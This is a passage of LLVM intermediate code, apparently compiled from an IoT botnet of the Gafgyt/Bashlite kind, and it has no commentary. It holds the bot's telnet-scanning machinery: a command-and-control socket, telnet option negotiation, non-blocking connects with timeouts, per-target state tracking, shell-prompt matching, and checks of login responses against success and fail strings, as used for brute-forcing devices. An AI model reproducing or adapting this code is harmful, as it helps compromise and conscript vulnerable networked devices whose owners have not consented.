  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  br i1 %82, label %83, label %86

; <label>:83:                                     ; preds = %67
  %84 = load i32, i32* %13, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %13, align 4
  br label %50

; <label>:86:                                     ; preds = %67
  br label %87

; <label>:87:                                     ; preds = %86, %50
  br label %88

; <label>:88:                                     ; preds = %87, %33
  store i32 0, i32* %18, align 4
  %89 = load i8*, i8** %6, align 8
  store i8* %89, i8** %17, align 8
  br label %90

; <label>:90:                                     ; preds = %108, %88
  %91 = load i32, i32* %7, align 4
  %92 = add nsw i32 %91, -1
  store i32 %92, i32* %7, align 4
  %93 = icmp sgt i32 %91, 1
  br i1 %93, label %94, label %111

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i64 @recv(i32 %95, i8* %16, i64 1, i32 0)
  %97 = icmp ne i64 %96, 1
  br i1 %97, label %98, label %100

; <label>:98:                                     ; preds = %94
  %99 = load i8*, i8** %17, align 8
  store i8 0, i8* %99, align 1
  store i32 -1, i32* %4, align 4
  br label %114

; <label>:100:                                    ; preds = %94
  %101 = load i8, i8* %16, align 1
  %102 = load i8*, i8** %17, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %17, align 8
  store i8 %101, i8* %102, align 1
  %104 = load i8, i8* %16, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 10
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %100
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %18, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %18, align 4
  br label %90

; <label>:111:                                    ; preds = %107, %90
  %112 = load i8*, i8** %17, align 8
  store i8 0, i8* %112, align 1
  %113 = load i32, i32* %18, align 4
  store i32 %113, i32* %4, align 4
  br label %114

; <label>:114:                                    ; preds = %111, %98
  %115 = load i32, i32* %4, align 4
  ret i32 %115
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #4

declare i64 @recv(i32, i8*, i64, i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !3
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %51

; <label>:44:                                     ; preds = %27
  %45 = load i32, i32* %6, align 4
  %46 = load i8*, i8** %8, align 8
  %47 = load i32, i32* %9, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @recv(i32 %45, i8* %46, i64 %48, i32 0)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %5, align 4
  br label %51

; <label>:51:                                     ; preds = %44, %43
  %52 = load i32, i32* %5, align 4
  ret i32 %52
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %8
  br label %8

; <label>:17:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %18

; <label>:18:                                     ; preds = %33, %17
  %19 = load i32, i32* %7, align 4
  %20 = load i32, i32* %6, align 4
  %21 = icmp slt i32 %19, %20
  br i1 %21, label %22, label %36

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %4, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8*, i8** %24, i64 %26
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %23, i8* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %22
  store i32 1, i32* %3, align 4
  br label %37

; <label>:32:                                     ; preds = %22
  br label %33

; <label>:33:                                     ; preds = %32
  %34 = load i32, i32* %7, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %7, align 4
  br label %18

; <label>:36:                                     ; preds = %18
  store i32 0, i32* %3, align 4
  br label %37

; <label>:37:                                     ; preds = %36, %31
  %38 = load i32, i32* %3, align 4
  ret i32 %38
}

declare i32 @strcasestr(...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %100

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %91

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %89

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #5, !srcloc !4
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #5
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %100

; <label>:86:                                     ; preds = %79
  br label %88

; <label>:87:                                     ; preds = %63
  store i32 0, i32* %5, align 4
  br label %100

; <label>:88:                                     ; preds = %86
  br label %90

; <label>:89:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %100

; <label>:90:                                     ; preds = %88
  br label %91

; <label>:91:                                     ; preds = %90, %37
  %92 = load i32, i32* %6, align 4
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %15, align 8
  %95 = load i64, i64* %15, align 8
  %96 = and i64 %95, -2049
  store i64 %96, i64* %15, align 8
  %97 = load i32, i32* %6, align 4
  %98 = load i64, i64* %15, align 8
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i64 %98)
  store i32 1, i32* %5, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %89, %87, %85, %36
  %101 = load i32, i32* %5, align 4
  ret i32 %101
}

declare i32 @fcntl(i32, i32, ...) #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #2

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #5
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #5
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

; <label>:34:                                     ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

; <label>:46:                                     ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

; <label>:58:                                     ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

; <label>:70:                                     ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

; <label>:72:                                     ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18

; <label>:77:                                     ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

; <label>:96:                                     ; preds = %77
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11

; <label>:100:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 512, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
